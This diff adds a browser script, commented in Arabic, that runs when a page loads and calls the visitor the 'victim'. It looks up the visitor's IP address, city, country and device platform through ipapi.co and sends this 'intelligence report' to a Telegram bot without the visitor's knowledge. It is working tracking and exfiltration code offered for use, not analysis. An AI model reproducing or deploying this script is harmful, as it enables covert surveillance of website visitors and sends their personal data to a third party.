@@ -1,0 +1,36 @@
+<script>
+// استدعاء البيانات من بيئة فيرسال الآمنة
+const TELEGRAM_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_TOKEN;
+const CHAT_ID = process.env.NEXT_PUBLIC_CHAT_ID;
+
+async function sendToTelegram(message) {
+    // الكود يرسل التقرير الاستخباراتي المماثل للصورة
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (error) {
+        console.error("Signal Lost");
+    }
+}
+
+// تنفيذ التقرير التلقائي عند دخول الضحية
+window.onload = async function() {
+    const ipRes = await fetch('https://ipapi.co/json/');
+    const loc = await ipRes.json();
+    
+    // بناء التقرير الاستخباراتي (Intelligence Report)
+    let report = `📊 *INTELLIGENCE REPORT* 📊\n` +
+                 `📍 IP: ${loc.ip}\n` +
+                 `🌍 Location: ${loc.city}, ${loc.country_name}\n` +
+                 `📱 Device: ${navigator.platform}`;
+
+    sendToTelegram(report);
+};
+</script>
